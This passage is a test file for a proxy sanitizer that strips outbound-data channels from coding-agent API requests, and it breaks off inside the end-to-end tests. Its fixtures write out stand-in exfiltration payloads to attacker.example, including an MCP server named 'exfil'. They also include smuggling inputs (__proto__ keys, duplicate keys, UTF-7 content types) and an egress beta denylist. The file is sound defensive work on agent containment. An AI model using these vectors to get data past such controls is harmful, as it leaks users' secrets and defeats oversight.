/**
 * MITM request sanitizer framework and the Anthropic Messages sanitizer.
 *
 * Covers per-field removal (tools allowlist, mcp_servers, container,
 * URL-sourced content, replayed provider-side tool blocks, egress betas), the
 * fail-closed body pipeline (strict parse, rewriter-then-sanitizer, canonical
 * re-serialization), the provider bindings, and end-to-end behaviour through
 * the real MITM for api.anthropic.com, Z.AI and OpenRouter.
 *
 * No provider is contacted. Request bodies are hand-written in each client's
 * wire shape; `fixtures/claude-code-messages-request.json` mirrors a Claude
 * Code `/v1/messages` request (custom tools incl. deferred ones, base64 image
 * and PDF, thinking, tool_reference results, cache control, context
 * management). The MITM forwards to a local fake upstream.
 */

import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type * as http from 'node:http';
import type { Socket } from 'node:net';
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { gzipSync } from 'node:zlib';
import { loadOrCreateCA, type CertificateAuthority } from '../../src/docker/ca.js';
import { createMitmProxy, type MitmProxy } from '../../src/docker/mitm-proxy.js';
import {
  anthropicOAuthProvider,
  anthropicProvider,
  claudePlatformOAuthProvider,
  claudePlatformProvider,
  codexAuthProvider,
  codexChatGptProvider,
  googleProvider,
  openaiProvider,
  resolveRequestSanitizer,
  type ProviderConfig,
  type RequestBodyRewriter,
} from '../../src/docker/provider-config.js';
import {
  ANTHROPIC_EGRESS_BETA_PREFIXES,
  NEUTRALIZED_CONTENT_TEXT,
  REQUEST_REJECTED,
  anthropicMessagesSanitizer,
  describeLabels,
  isRequestRejectedError,
  openaiPlatformSanitizer,
  processRequestBody,
  requestSanitizerFor,
  sanitizeRequestHeaders,
  sanitizedEndpointsFor,
  RequestRejectedError,
  SANITIZED_BODY_CONTENT_TYPE,
} from '../../src/docker/request-sanitizers/index.js';
import { makeGatewayProvider } from '../../src/docker/gateway-runtime.js';
import { makeZaiProvider } from '../../src/docker/zai.js';
import { getGatewayDefinition, type GatewayProfile } from '../../src/config/provider-definitions.js';
import type { ResolvedZaiProfile } from '../../src/config/user-config.js';
import * as logger from '../../src/logger.js';
import {
  createFakeUpstream,
  localhostDnsLookup,
  makeHttpsRequest,
  sendConnect,
  type FakeUpstream,
  type HttpsResponse,
} from '../helpers/mitm-tls-harness.js';

const FIXTURES_DIR = join(dirname(fileURLToPath(import.meta.url)), 'fixtures');

/** The Claude Code request as Claude Code sends it: minified JSON.stringify output. */
const CLAUDE_CODE_REQUEST = JSON.stringify(
  JSON.parse(readFileSync(join(FIXTURES_DIR, 'claude-code-messages-request.json'), 'utf-8')),
);

/** Betas Claude Code sends on an ordinary turn (none enables provider-side egress). */
const CLAUDE_CODE_BETAS =
  'claude-code-20250219,oauth-2025-04-20,interleaved-thinking-2025-05-14,fine-grained-tool-streaming-2025-05-14,context-management-2025-06-27';

const CTX = { method: 'POST', path: '/v1/messages' };

function sanitize(body: Record<string, unknown>) {
  return anthropicMessagesSanitizer.sanitizeBody(body, CTX);
}

function rejection(fn: () => unknown): RequestRejectedError {
  try {
    fn();
  } catch (error) {
    if (isRequestRejectedError(error)) return error;
    throw error;
  }
  throw new Error('expected the request to be rejected');
}

const URL_IMAGE = { type: 'image', source: { type: 'url', url: 'https://attacker.example/i.png?d=c2VjcmV0' } };
const BASE64_IMAGE = { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'iVBORw0KGgo=' } };
const PLACEHOLDER = { type: 'text', text: NEUTRALIZED_CONTENT_TEXT };

// ─── Body: per-field removal ────────────────────────────────────────────

describe('anthropic-messages sanitizer: body', () => {
  it('drops mcp_servers (the MCP connector)', () => {
    const result = sanitize({
      model: 'claude-sonnet-4-5',
      mcp_servers: [{ type: 'url', url: 'https://attacker.example/sse?d=SECRET', name: 'x' }],
      messages: [{ role: 'user', content: 'hi' }],
    });
    expect(result.body).toEqual({ model: 'claude-sonnet-4-5', messages: [{ role: 'user', content: 'hi' }] });
    expect(result.removed).toEqual(['mcp_servers']);
  });

  it('drops container (code-execution containers and Agent Skills)', () => {
    for (const container of ['cntr_0123', { id: 'cntr_0123', skills: [{ type: 'anthropic', skill_id: 'pptx' }] }]) {
      const result = sanitize({ model: 'm', container, messages: [] });
      expect(result.body).toEqual({ model: 'm', messages: [] });
      expect(result.removed).toEqual(['container']);
    }
  });

  it('keeps only untyped and custom tools, dropping every provider-defined tool', () => {
    const bash = { name: 'Bash', input_schema: { type: 'object' } };
    const custom = { type: 'custom', name: 'lookup', input_schema: { type: 'object' } };
    const result = sanitize({
      model: 'm',
      tools: [
        bash,
        { type: 'web_fetch_20250910', name: 'web_fetch', max_uses: 5 },
        { type: 'web_search_20250305', name: 'web_search' },
        custom,
        { type: 'code_execution_20250825', name: 'code_execution' },
        { type: 'mcp_toolset', mcp_server_name: 'x' },
        { type: 'bash_20250124', name: 'bash' },
        { type: 'computer_20250124', name: 'computer', display_width_px: 1024, display_height_px: 768 },
        { type: 'future_hosted_tool_20990101', name: 'future' },
        { type: null, name: 'null-typed' },
        'web_search',
        42,
      ],
    });
    expect(result.body.tools).toEqual([bash, custom]);
    expect(result.removed).toEqual([
      'tool:web_fetch_20250910',
      'tool:web_search_20250305',
      'tool:code_execution_20250825',
      'tool:mcp_toolset',
      'tool:bash_20250124',
      'tool:computer_20250124',
      'tool:future_hosted_tool_20990101',
      'tool:<null>',
      'tool:web_search',
      'tool:<number>',
    ]);
  });

  it('empties the tools array when every tool is provider-defined', () => {
    const result = sanitize({ model: 'm', tools: [{ type: 'web_search_20250305', name: 'web_search', max_uses: 8 }] });
    expect(result.body.tools).toEqual([]);
    expect(result.removed).toEqual(['tool:web_search_20250305']);
  });

  it('neutralizes a URL image inside tool_result content', () => {
    const result = sanitize({
      model: 'm',
      messages: [
        {
          role: 'user',
          content: [
            {
              type: 'tool_result',
              tool_use_id: 'toolu_1',
              content: [{ type: 'text', text: 'see image' }, URL_IMAGE, BASE64_IMAGE],
            },
          ],
        },
      ],
    });
    const messages = result.body.messages as { content: { content: unknown[] }[] }[];
    expect(messages[0].content[0].content).toEqual([{ type: 'text', text: 'see image' }, PLACEHOLDER, BASE64_IMAGE]);
    expect(result.removed).toEqual(['image:source:url']);
    expect(JSON.stringify(result.body)).not.toContain('attacker.example');
  });

  it('neutralizes URL and file sources in message content and system, keeping inline sources', () => {
    const inlineDocs = [
      { type: 'document', source: { type: 'base64', media_type: 'application/pdf', data: 'JVBERi0=' } },
      { type: 'document', source: { type: 'text', media_type: 'text/plain', data: 'plain text' } },
      { type: 'search_result', source: 'https://example.com/a', title: 't', content: [{ type: 'text', text: 'x' }] },
    ];
    const result = sanitize({
      model: 'm',
      system: [
        { type: 'text', text: 'sys' },
        { ...URL_IMAGE, cache_control: { type: 'ephemeral' } },
      ],
      messages: [
        {
          role: 'user',
          content: [
            URL_IMAGE,
            { type: 'document', source: { type: 'url', url: 'https://attacker.example/doc.pdf' } },
            { type: 'image', source: { type: 'file', file_id: 'file_011' } },
            { type: 'image', source: { url: 'https://attacker.example/no-type.png' } },
            BASE64_IMAGE,
            ...inlineDocs,
          ],
        },
      ],
    });
    expect(result.body.system).toEqual([
      { type: 'text', text: 'sys' },
      { ...PLACEHOLDER, cache_control: { type: 'ephemeral' } },
    ]);
    const messages = result.body.messages as { content: unknown[] }[];
    expect(messages[0].content).toEqual([
      PLACEHOLDER,
      PLACEHOLDER,
      PLACEHOLDER,
      PLACEHOLDER,
      BASE64_IMAGE,
      ...inlineDocs,
    ]);
    // Messages are walked before system.
    expect(result.removed).toEqual([
      'image:source:url',
      'document:source:url',
      'image:source:file',
      'image:source:<undefined>',
      'image:source:url',
    ]);
  });

  it('walks document content sources and single-block content objects', () => {
    const result = sanitize({
      model: 'm',
      messages: [
        {
          role: 'user',
          content: [
            { type: 'document', source: { type: 'content', content: [{ type: 'text', text: 'page' }, URL_IMAGE] } },
            { type: 'tool_result', tool_use_id: 'toolu_2', content: URL_IMAGE },
          ],
        },
      ],
    });
    const messages = result.body.messages as { content: unknown[] }[];
    expect(messages[0].content).toEqual([
      { type: 'document', source: { type: 'content', content: [{ type: 'text', text: 'page' }, PLACEHOLDER] } },
      { type: 'tool_result', tool_use_id: 'toolu_2', content: PLACEHOLDER },
    ]);
    expect(result.removed).toEqual(['image:source:url', 'image:source:url']);
  });

  it('neutralizes a source that is not an inline-data object (bare URL string, array, null)', () => {
    const result = sanitize({
      model: 'm',
      system: [{ type: 'document', source: 'https://attacker.example/sys.pdf' }],
      messages: [
        {
          role: 'user',
          content: [
            { type: 'image', source: 'https://attacker.example/i.png?d=c2VjcmV0' },
            { type: 'document', source: [{ type: 'url', url: 'https://attacker.example/d.pdf' }] },
            { type: 'tool_result', tool_use_id: 'toolu_5', content: [{ type: 'image', source: null }] },
          ],
        },
      ],
    });
    expect(result.body.system).toEqual([PLACEHOLDER]);
    expect(result.body.messages).toEqual([
      {
        role: 'user',
        content: [PLACEHOLDER, PLACEHOLDER, { type: 'tool_result', tool_use_id: 'toolu_5', content: [PLACEHOLDER] }],
      },
    ]);
    // Labels name the kind of source, never the (possibly secret-bearing) URL.
    expect(result.removed).toEqual([
      'image:source:<string>',
      'document:source:<array>',
      'image:source:<null>',
      'document:source:<string>',
    ]);
    expect(JSON.stringify(result.body)).not.toContain('attacker.example');
  });

  it.each([
    ['a nested array in message content', { messages: [{ role: 'user', content: [[URL_IMAGE]] }] }],
    [
      'a string in tool_result content',
      { messages: [{ role: 'user', content: [{ type: 'tool_result', content: ['x'] }] }] },
    ],
    ['null in system', { system: [{ type: 'text', text: 'sys' }, null] }],
    [
      'a nested array in a document content source',
      {
        messages: [
          { role: 'user', content: [{ type: 'document', source: { type: 'content', content: [[URL_IMAGE]] } }] },
        ],
      },
    ],
  ])('rejects a content block list with a non-object entry: %s', (_label, fields) => {
    // The walker cannot inspect such an entry, and a lenient upstream that
    // flattened it would receive blocks nobody checked.
    const error = rejection(() => sanitize({ model: 'm', ...fields }));
    expect(error.status).toBe(400);
    expect(error.message).toBe('each content block must be an object');
  });

  it('drops replayed provider-side tool activity and keeps client tool calls', () => {
    const toolUse = { type: 'tool_use', id: 'toolu_3', name: 'Bash', input: { command: 'ls' } };
    const result = sanitize({
      model: 'm',
      messages: [
        {
          role: 'assistant',
          content: [
            { type: 'text', text: 'searching' },
            {
              type: 'server_tool_use',
              id: 'srvtoolu_1',
              name: 'web_fetch',
              input: { url: 'https://attacker.example' },
            },
            { type: 'web_fetch_tool_result', tool_use_id: 'srvtoolu_1', content: { type: 'web_fetch_result' } },
            { type: 'web_search_tool_result', tool_use_id: 'srvtoolu_0', content: [] },
            { type: 'mcp_tool_use', id: 'mcptoolu_1', name: 'x', server_name: 's', input: {} },
            { type: 'mcp_tool_result', tool_use_id: 'mcptoolu_1', content: [] },
            { type: 'code_execution_tool_result', tool_use_id: 'srvtoolu_2', content: {} },
            toolUse,
          ],
        },
        { role: 'assistant', content: [{ type: 'server_tool_use', id: 'srvtoolu_4', name: 'web_search', input: {} }] },
        { role: 'user', content: [{ type: 'container_upload', file_id: 'file_012' }] },
      ],
    });
    expect(result.body.messages).toEqual([
      { role: 'assistant', content: [{ type: 'text', text: 'searching' }, toolUse] },
      { role: 'assistant', content: [PLACEHOLDER] },
      { role: 'user', content: [PLACEHOLDER] },
    ]);
    expect(result.removed).toEqual([
      'block:server_tool_use',
      'block:web_fetch_tool_result',
      'block:web_search_tool_result',
      'block:mcp_tool_use',
      'block:mcp_tool_result',
      'block:code_execution_tool_result',
      'block:server_tool_use',
      'block:container_upload',
    ]);
  });

  it("leaves Claude Code's ordinary request untouched (same object, nothing removed)", () => {
    const body = JSON.parse(CLAUDE_CODE_REQUEST) as Record<string, unknown>;
    const result = sanitize(body);
    expect(result.body).toBe(body);
    expect(result.removed).toEqual([]);
  });

  it('never mutates the input body', () => {
    const body = {
      model: 'm',
      mcp_servers: [{ type: 'url', url: 'https://attacker.example' }],
      tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }],
      messages: [{ role: 'user', content: [URL_IMAGE] }],
      system: [URL_IMAGE],
    };
    const before = structuredClone(body);
    sanitize(body);
    expect(body).toEqual(before);
  });

  // processRequestBody drops __proto__ keys before the sanitizer runs; on its
  // own the sanitizer must still never invoke the prototype setter.
  it('treats a parsed __proto__ key as data, never as a prototype, while removing fields', () => {
    const body = JSON.parse('{"model":"m","__proto__":{"polluted":true},"mcp_servers":[]}') as Record<string, unknown>;
    const result = sanitize(body);
    expect(Object.hasOwn(result.body, '__proto__')).toBe(true);
    expect(JSON.stringify(result.body)).toBe('{"model":"m","__proto__":{"polluted":true}}');
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it.each([
    ['absent', {}],
    ['a number', { model: 42 }],
    ['null', { model: null }],
  ])('rejects a request whose model is %s', (_label, fields) => {
    const error = rejection(() => sanitize({ ...fields, messages: [] }));
    expect(error.status).toBe(400);
    expect(error.code).toBe(REQUEST_REJECTED);
  });

  it.each([
    ['tools is not an array', { tools: { type: 'web_search_20250305' } }],
    ['messages is not an array', { messages: { 0: { role: 'user', content: [URL_IMAGE] } } }],
    ['a message is not an object', { messages: ['hi'] }],
  ])('rejects a malformed core field: %s', (_label, fields) => {
    expect(rejection(() => sanitize({ model: 'm', ...fields })).status).toBe(400);
  });

  it('rejects content nested deeper than any real request', () => {
    let content: unknown = [{ type: 'text', text: 'leaf' }];
    for (let depth = 0; depth < 20; depth++) content = [{ type: 'tool_result', tool_use_id: 't', content }];
    expect(rejection(() => sanitize({ model: 'm', messages: [{ role: 'user', content }] })).status).toBe(400);
  });
});

// ─── Headers: anthropic-beta denylist ───────────────────────────────────

describe('anthropic-messages sanitizer: anthropic-beta header', () => {
  it('removes egress-capable betas by prefix and keeps every other beta', () => {
    const headers: http.OutgoingHttpHeaders = {
      'anthropic-beta':
        'claude-code-20250219, mcp-client-2025-04-04,interleaved-thinking-2025-05-14,web-fetch-2025-09-10,' +
        'code-execution-2025-08-25,computer-use-2025-01-24,skills-2025-10-02,files-api-2025-04-14,' +
        'context-management-2025-06-27,mcp-client-2025-11-20',
    };
    const removed = anthropicMessagesSanitizer.sanitizeHeaders(headers);
    expect(headers['anthropic-beta']).toBe(
      'claude-code-20250219,interleaved-thinking-2025-05-14,context-management-2025-06-27',
    );
    expect(removed).toEqual([
      'anthropic-beta:mcp-client-2025-04-04',
      'anthropic-beta:web-fetch-2025-09-10',
      'anthropic-beta:code-execution-2025-08-25',
      'anthropic-beta:computer-use-2025-01-24',
      'anthropic-beta:skills-2025-10-02',
      'anthropic-beta:files-api-2025-04-14',
      'anthropic-beta:mcp-client-2025-11-20',
    ]);
  });

  it('covers every listed prefix, case-insensitively, in array-valued headers', () => {
    const headers: http.OutgoingHttpHeaders = {
      'anthropic-beta': [...ANTHROPIC_EGRESS_BETA_PREFIXES.map((prefix) => `${prefix.toUpperCase()}2099-01-01`), 'x-1'],
    };
    expect(anthropicMessagesSanitizer.sanitizeHeaders(headers)).toHaveLength(ANTHROPIC_EGRESS_BETA_PREFIXES.length);
    expect(headers['anthropic-beta']).toBe('x-1');
  });

  it('deletes the header when every value is removed', () => {
    const headers: http.OutgoingHttpHeaders = { 'anthropic-beta': 'mcp-client-2025-04-04', 'x-api-key': 'k' };
    expect(anthropicMessagesSanitizer.sanitizeHeaders(headers)).toEqual(['anthropic-beta:mcp-client-2025-04-04']);
    expect(headers).toEqual({ 'x-api-key': 'k' });
  });

  it("leaves Claude Code's betas byte-identical", () => {
    const value = CLAUDE_CODE_BETAS.replaceAll(',', ', ');
    const headers: http.OutgoingHttpHeaders = { 'anthropic-beta': value, 'anthropic-version': '2023-06-01' };
    expect(anthropicMessagesSanitizer.sanitizeHeaders(headers)).toEqual([]);
    expect(headers).toEqual({ 'anthropic-beta': value, 'anthropic-version': '2023-06-01' });
  });

  it('escapes control characters in removal labels', () => {
    const headers: http.OutgoingHttpHeaders = { 'anthropic-beta': 'mcp-client-\u001b[2Jx\n' };
    const [label] = anthropicMessagesSanitizer.sanitizeHeaders(headers);
    expect(label).toBe('anthropic-beta:mcp-client-\\u001b[2Jx');
  });
});

// ─── Pipeline: parse, rewrite, sanitize, serialize ──────────────────────

describe('processRequestBody', () => {
  const stages = { sanitizer: anthropicMessagesSanitizer };
  const process = (raw: string | Buffer, rewriter?: RequestBodyRewriter) =>
    processRequestBody(Buffer.isBuffer(raw) ? raw : Buffer.from(raw), { ...stages, rewriter }, CTX);

  it.each([
    ['malformed JSON', '{"model":"m",'],
    ['an empty body', ''],
    ['a JSON array', '[{"model":"m"}]'],
    ['a JSON string', '"model"'],
    ['JSON null', 'null'],
  ])('rejects %s with 400', (_label, raw) => {
    expect(rejection(() => process(raw)).status).toBe(400);
  });

  it('rejects invalid UTF-8 instead of replacing it', () => {
    const raw = Buffer.concat([Buffer.from('{"model":"m","x":"'), Buffer.from([0xff, 0xfe]), Buffer.from('"}')]);
    expect(rejection(() => process(raw)).message).toContain('UTF-8');
  });

  it('rejects a body nested too deeply to re-serialize', () => {
    const raw = `{"model":"m","x":${'['.repeat(200_000)}${']'.repeat(200_000)}}`;
    expect(rejection(() => process(raw)).status).toBe(400);
  });

  it('rejects malformed JSON even on a rewriter-only route (no sanitizer)', () => {
    const rewriter: RequestBodyRewriter = () => null;
    expect(rejection(() => processRequestBody(Buffer.from('not json'), { rewriter }, CTX)).status).toBe(400);
  });

  it('forwards the canonical serialization, so a duplicate key cannot smuggle a hosted tool', () => {
    const raw = '{"model":"m","tools":[{"type":"web_search_20250305","name":"web_search"}],"tools":[]}';
    const result = process(raw);
    expect(result.body.toString()).toBe('{"model":"m","tools":[]}');
    expect(result.removed).toEqual([]);
  });

  it('drops __proto__ keys at any depth, so fields hidden under them cannot reach a JavaScript gateway', () => {
    // JSON.parse keeps "__proto__" as an ordinary key: the sanitizer would not
    // see the hosted tool or the URL image, but Object.assign-style copying
    // upstream would turn them into real `tools` / `content` fields.
    const raw = JSON.stringify({ model: 'm', messages: [{ role: 'user', content: 'hi' }] })
      .replace('{"model"', '{"__proto__":{"tools":[{"type":"web_search_20250305","name":"web_search"}]},"model"')
      .replace('"content":"hi"', `"content":"hi","__proto__":{"content":[${JSON.stringify(URL_IMAGE)}]}`);
    expect(raw).toContain('__proto__');
    const result = process(raw);
    expect(result.body.toString()).toBe('{"model":"m","messages":[{"role":"user","content":"hi"}]}');
    expect(result.removed).toEqual(['key:__proto__', 'key:__proto__']);

    const rewriterOnly = processRequestBody(Buffer.from(raw), { rewriter: () => null }, CTX);
    expect(rewriterOnly.body.toString()).not.toContain('__proto__');
    expect(rewriterOnly.removed).toEqual(['key:__proto__', 'key:__proto__']);
  });

  it('reuses the raw bytes when the body is already canonical and unchanged', () => {
    const raw = Buffer.from(CLAUDE_CODE_REQUEST);
    const result = process(raw);
    expect(result.body).toBe(raw);
    expect(result.removed).toEqual([]);
  });

  it('runs the rewriter first and sanitizes its output', () => {
    const rewriter: RequestBodyRewriter = (body) => ({
      modified: { ...body, model: 'mapped', tools: [{ type: 'web_search_20250305', name: 'web_search' }] },
      stripped: ['model:mapped'],
    });
    const result = process('{"model":"requested","tools":[]}', rewriter);
    expect(JSON.parse(result.body.toString())).toEqual({ model: 'mapped', tools: [] });
    expect(result.rewritten).toEqual(['model:mapped']);
    expect(result.removed).toEqual(['tool:web_search_20250305']);
  });

  it('keeps the raw bytes on a rewriter-only route when the rewriter changes nothing', () => {
    const raw = Buffer.from('{ "model": "m" }');
    expect(processRequestBody(raw, { rewriter: () => null }, CTX).body).toBe(raw);
  });

  it('recognizes rejections by code and status, never by class alone', () => {
    expect(isRequestRejectedError(new RequestRejectedError(400, 'bad body'))).toBe(true);
    expect(isRequestRejectedError({ code: REQUEST_REJECTED, status: 415, message: 'encoding' })).toBe(true);
    expect(isRequestRejectedError({ code: REQUEST_REJECTED, status: 413, message: 'decoded too large' })).toBe(true);
    expect(isRequestRejectedError({ code: REQUEST_REJECTED, status: 500, message: 'not a local answer' })).toBe(false);
    expect(isRequestRejectedError(Object.assign(new Error('no status'), { code: REQUEST_REJECTED }))).toBe(false);
    expect(isRequestRejectedError(new Error('plain'))).toBe(false);
    expect(isRequestRejectedError(undefined)).toBe(false);
  });

  it('pins the forwarded Content-Type to the canonical JSON body, then applies the protocol header rules', () => {
    // UTF-7 and form decoding read different fields out of the same bytes
    // ("+ACI-" is a quote in UTF-7; "&mcp_servers[0][url]=..." is a form
    // field), so an agent-chosen media type must never reach the upstream.
    for (const declared of [
      'application/json; charset=utf-7',
      'application/x-www-form-urlencoded',
      'multipart/form-data; boundary=x',
      'text/plain',
    ]) {
      const headers: http.OutgoingHttpHeaders = { 'content-type': declared, 'anthropic-beta': 'mcp-client-2025-04-04' };
      expect(sanitizeRequestHeaders(anthropicMessagesSanitizer, headers)).toEqual([
        `content-type:${declared}`,
        'anthropic-beta:mcp-client-2025-04-04',
      ]);
      expect(headers).toEqual({ 'content-type': SANITIZED_BODY_CONTENT_TYPE });
    }
  });

  it('declares a missing or equivalent Content-Type as application/json without logging it', () => {
    for (const declared of [undefined, 'application/json', 'Application/JSON ; charset=UTF-8']) {
      const headers: http.OutgoingHttpHeaders = declared === undefined ? {} : { 'content-type': declared };
      expect(sanitizeRequestHeaders(anthropicMessagesSanitizer, headers)).toEqual([]);
      expect(headers).toEqual({ 'content-type': 'application/json' });
    }
  });

  it('describes labels on one line with duplicates counted and the list capped', () => {
    expect(describeLabels(['a', 'b', 'a', 'line\nbreak'])).toBe('a (x2), b, line\\nbreak');
    const many = Array.from({ length: 30 }, (_, index) => `label-${index}`);
    expect(describeLabels(many)).toMatch(/label-23, \+6 more$/);
  });
});

// ─── Provider bindings ──────────────────────────────────────────────────

const zaiProfile: ResolvedZaiProfile = {
  type: 'zai',
  apiKey: 'host-only-key',
  model: 'glm-5.3',
  plan: 'api',
  modelMap: [{ match: '*', model: 'glm-5.3' }],
  usesDefaultMap: false,
  perAgent: { 'claude-code': undefined, codex: undefined, goose: undefined },
};

const openRouterProfile: GatewayProfile = {
  type: 'openrouter',
  apiKey: '',
  modelMap: [{ match: '*sonnet*', model: 'z-ai/glm-5.2' }],
  usesDefaultMap: false,
  perAgent: { 'claude-code': undefined, codex: undefined, goose: undefined },
  sessionAffinity: false,
};

/** Every built-in provider config, including each gateway route for each protocol and agent. */
function builtInProviderConfigs(): ProviderConfig[] {
  const gateways: ProviderConfig[] = [];
  for (const [profile, type] of [
    [openRouterProfile, 'openrouter'],
    [zaiProfile, 'zai'],
    [{ ...zaiProfile, plan: 'coding' }, 'zai'],
  ] as const) {
    for (const [protocol, agent] of [
      ['messages', 'claude-code'],
      ['responses', 'codex'],
      ['chat', 'goose'],
    ] as const) {
      gateways.push(makeGatewayProvider(profile, protocol, agent, getGatewayDefinition(type)));
    }
  }
  return [
    anthropicProvider,
    anthropicOAuthProvider,
    claudePlatformProvider,
    claudePlatformOAuthProvider,
    openaiProvider,
    codexChatGptProvider,
    codexAuthProvider,
    googleProvider,
    ...gateways,
  ];
}

/**
 * The layer a route chains in front of the protocol sanitizer, if any: a
 * gateway's own (OpenRouter), or the model check on OpenAI's own routes
 * (api.openai.com and the ChatGPT Codex backend).
 */
function gatewayLayer(config: ProviderConfig): string | undefined {
  if (config.host === 'api.openai.com' || config.host === 'chatgpt.com') return openaiPlatformSanitizer.protocol;
  const id = config.gatewayAdapterId;
  return id === undefined || id === 'direct' ? undefined : getGatewayDefinition(id).gatewaySanitizer;
}

describe('sanitizer bindings', () => {
  it('binds every built-in completion endpoint whose protocol has a sanitizer', () => {
    let checked = 0;
    for (const config of builtInProviderConfigs()) {
      for (const endpoint of config.completionEndpoints ?? []) {
        const sanitizer = requestSanitizerFor(endpoint.protocol);
        if (!sanitizer) continue;
        const path = endpoint.path.replaceAll('*', 'sample-model');
        const resolved = resolveRequestSanitizer(config, endpoint.method, path);
        const layer = gatewayLayer(config);
        // A gateway or provider with egress features of its own chains its
        // sanitizer in front of the protocol's (request-sanitizer-gemini-openrouter.test.ts,
        // request-sanitizer-openai.test.ts).
        if (layer) expect(resolved?.protocol, `${config.displayName} ${path}`).toBe(`${layer}+${sanitizer.protocol}`);
        else expect(resolved, `${config.displayName} ${path}`).toBe(sanitizer);
        checked++;
      }
    }
    // At least api.anthropic.com (API key + OAuth), Z.AI (both plans), OpenRouter messages and Gemini (both routes).
    expect(checked).toBeGreaterThanOrEqual(7);
  });

  it.each([
    ['api.anthropic.com (API key)', anthropicProvider, '/v1/messages', '/v1/messages/count_tokens'],
    ['api.anthropic.com (OAuth)', anthropicOAuthProvider, '/v1/messages', '/v1/messages/count_tokens'],
    [
      'Z.AI messages',
      makeZaiProvider(zaiProfile, 'claude-code'),
      '/api/anthropic/v1/messages',
      '/api/anthropic/v1/messages/count_tokens',
    ],
  ])('%s sanitizes the completion and count_tokens routes', (_label, config, completion, countTokens) => {
    expect(resolveRequestSanitizer(config, 'POST', completion)).toBe(anthropicMessagesSanitizer);
    expect(resolveRequestSanitizer(config, 'POST', `${completion}?beta=true`)).toBe(anthropicMessagesSanitizer);
    expect(resolveRequestSanitizer(config, 'POST', countTokens)).toBe(anthropicMessagesSanitizer);
    expect(resolveRequestSanitizer(config, 'GET', completion)).toBeUndefined();
    // The compatibility rewriter still runs on the completion route only.
    expect(config.rewriteEndpoints).toEqual([completion]);
  });

  it('OpenRouter messages sanitizes the completion and count_tokens routes, behind the OpenRouter layer', () => {
    const config = makeGatewayProvider(openRouterProfile, 'messages', 'claude-code');
    const completion = resolveRequestSanitizer(config, 'POST', '/api/v1/messages');
    expect(completion?.protocol).toBe('openrouter+anthropic-messages');
    expect(resolveRequestSanitizer(config, 'POST', '/api/v1/messages?beta=true')).toBe(completion);
    expect(resolveRequestSanitizer(config, 'POST', '/api/v1/messages/count_tokens')).toBe(completion);
    expect(resolveRequestSanitizer(config, 'GET', '/api/v1/messages')).toBeUndefined();
    expect(config.rewriteEndpoints).toEqual(['/api/v1/messages']);
    // The Anthropic rules still apply behind the OpenRouter layer.
    const result = completion?.sanitizeBody(
      { model: 'z-ai/glm-5.2', mcp_servers: [], tools: [{ type: 'web_search_20250305', name: 'web_search' }] },
      CTX,
    );
    expect(result?.body).toEqual({ model: 'z-ai/glm-5.2', tools: [] });
    expect(result?.removed).toEqual(['mcp_servers', 'tool:web_search_20250305']);
  });

  it('builds POST bindings for a registered protocol and none for an unknown one', () => {
    expect(sanitizedEndpointsFor('anthropic-messages', ['/a', '/b/*'])).toEqual([
      { method: 'POST', path: '/a', sanitizer: anthropicMessagesSanitizer },
      { method: 'POST', path: '/b/*', sanitizer: anthropicMessagesSanitizer },
    ]);
    expect(requestSanitizerFor('custom-protocol')).toBeUndefined();
  });

  it('a caller-supplied gateway rewriter cannot drop the sanitizer binding', () => {
    const definition = getGatewayDefinition('openrouter');
    const config = makeGatewayProvider(openRouterProfile, 'messages', 'claude-code', definition, [], () => null);
    expect(resolveRequestSanitizer(config, 'POST', '/api/v1/messages')?.protocol).toBe('openrouter+anthropic-messages');
  });

  it('leaves housekeeping endpoints unsanitized', () => {
    expect(resolveRequestSanitizer(anthropicProvider, 'POST', '/api/event_logging/batch')).toBeUndefined();
    expect(resolveRequestSanitizer(anthropicProvider, 'GET', '/api/hello')).toBeUndefined();
  });
});

// ─── End to end through the real MITM ───────────────────────────────────

const FAKE_KEY = 'sk-ironcurtain-sentinel-key';
const REAL_KEY = 'host-only-real-key';

describe('request sanitization through the MITM', () => {
  let tempDir: string;
  let ca: CertificateAuthority;
  let socketPath: string;
  let proxy: MitmProxy | undefined;
  let upstream: FakeUpstream | undefined;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'request-sanitizer-'));
    ca = loadOrCreateCA(join(tempDir, 'ca'));
    socketPath = join(tempDir, 'mitm.sock');
  });

  afterEach(async () => {
    logger.teardown();
    await proxy?.stop();
    proxy = undefined;
    if (upstream) {
      const server = upstream.server;
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
    upstream = undefined;
    if (existsSync(tempDir)) rmSync(tempDir, { recursive: true, force: true });
  });

  async function startProxy(config: ProviderConfig): Promise<void> {
    upstream = await createFakeUpstream();
    proxy = createMitmProxy({
      socketPath,
      ca,
      dnsLookup: localhostDnsLookup,
      allowPrivateDestinationsForTests: true,
      providers: [
        {
          config: {
            ...config,
            upstreamTarget: { hostname: '127.0.0.1', port: upstream.port, pathPrefix: '', useTls: false },
          },
          fakeKey: FAKE_KEY,
          realKey: REAL_KEY,
        },
      ],
    });
    await proxy.start();
  }

  async function post(
    host: string,
    path: string,
    body: string | Buffer | Record<string, unknown>,
    headers: Record<string, string>,
  ): Promise<HttpsResponse> {
    const { socket, statusCode } = await sendConnect(socketPath, host, 443);
    expect(statusCode).toBe(200);
    return makeHttpsRequest(socket as Socket, ca, host, {
      method: 'POST',
      path,
      headers: { 'content-type': 'application/json', ...headers },
      body: typeof body === 'string' || Buffer.isBuffer(body) ? body : JSON.stringify(body),
    });
  }

  function requests() {
    return upstream?.requests() ?? [];
  }

  /** Every hosted-egress vector of the acceptance criteria in one Anthropic request. */
  const hostileRequest = {
    model: 'claude-sonnet-4-5',
    max_tokens: 1024,
    mcp_servers: [{ type: 'url', url: 'https://attacker.example/sse?d=SECRET', name: 'exfil' }],
    container: { skills: [{ type: 'anthropic', skill_id: 'xlsx' }] },
    tools: [
      { name: 'Bash', input_schema: { type: 'object' } },
      { type: 'web_fetch_20250910', name: 'web_fetch', max_uses: 3 },
    ],
    messages: [
      {
        role: 'user',
        content: [{ type: 'tool_result', tool_use_id: 'toolu_9', content: [URL_IMAGE] }],
      },
    ],
  };
  const hostileBetas = 'claude-code-20250219,mcp-client-2025-04-04,web-fetch-2025-09-10';

